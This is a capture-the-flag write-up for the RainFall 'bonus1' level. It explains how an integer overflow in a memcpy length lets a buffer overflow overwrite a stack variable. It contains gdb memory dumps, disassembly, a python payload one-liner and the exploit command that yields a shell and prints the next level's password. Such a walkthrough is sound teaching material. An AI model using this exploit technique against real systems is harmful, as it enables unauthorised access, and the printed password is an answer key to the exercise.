## BONUS 1

Ressources:
- [Disassembled code](disassembled_code.md)
- [Source code](srcs/bonus1.c)

To solve this level we will use a **Buffer Overflow** and a **Integer Overflow**

*I won't explain the details of the program, because the source is pretty easy to understand what it does.*

In this level we have to change a integer value on the stack `val`, firstly I gonna take a look on the position of this value in the memory.

```shell
bonus1@RainFall:~$ gdb -q bonus1
Reading symbols from /home/user/bonus1/bonus1...(no debugging symbols found)...done.
(gdb) b *0x080484a3
Breakpoint 1 at 0x80484a3
(gdb) r 9 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Starting program: /home/user/bonus1/bonus1 9 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x080484a3 in main ()
(gdb) x/32x $esp + 0x14
0xbffff674:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff684:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff694:	0x41414141	0x080484b9	0x00000009	0x080484b0
0xbffff6a4:	0x00000000	0x00000000	0xb7e454d3	0x00000003
0xbffff6b4:	0xbffff744	0xbffff754	0xb7fdc858	0x00000000
0xbffff6c4:	0xbffff71c	0xbffff754	0x00000000	0x0804821c
0xbffff6d4:	0xb7fd0ff4	0x00000000	0x00000000	0x00000000
0xbffff6e4:	0xb92fcf47	0x8e6b8b57	0x00000000	0x00000000
```

Perfect, as we can see the variable `val` is 44 bytes after the start of our buffer. So is we want to overwrite this value we have to copy 44 elements with `memcpy()`. Let's take a look on `memcpy()` call.

```c
memcpy(str, av[2], val * 4);
```

The program forbids to set an input higher than 9. But we can see that `memcpy()` multiply this value by 4. As we now is we multiply a very big number or a very small number, we can overflow this number. Multiply the number by 4 is the same as bitshifting it by 2. So I will use this site to see what happens with a very small number *(INT_MIN)*

```
-2147483648 << 2 = 0
<==>
-2147483637 << 2 = 44
```

Amazing, if we use this number we can copy 44 elements with `memcpy()` and overwrite `val` with our second string.
We need to do a last more thing to solve this level, we need to find with which value the program compare `val`.

```shell
(gdb) disas main
Dump of assembler code for function main:
   0x08048424 <+0>:	push   %ebp
   [...]
   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
   0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)
   0x08048480 <+92>:	jne    0x804849e <main+122>
   [...]
   0x080484a4 <+128>:	ret
End of assembler dump.
```

The program compare `val` with the value `0x574f4c46`.

---

### Payload

`python -c 'print ("\x42" * 40 + "\x46\x4c\x4f\x57")' > /tmp/payload`

Perfect, we just have to inject the payload into the program.

```shell
bonus1@RainFall:~$ ./bonus1 -2147483637 $(cat /tmp/payload)
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```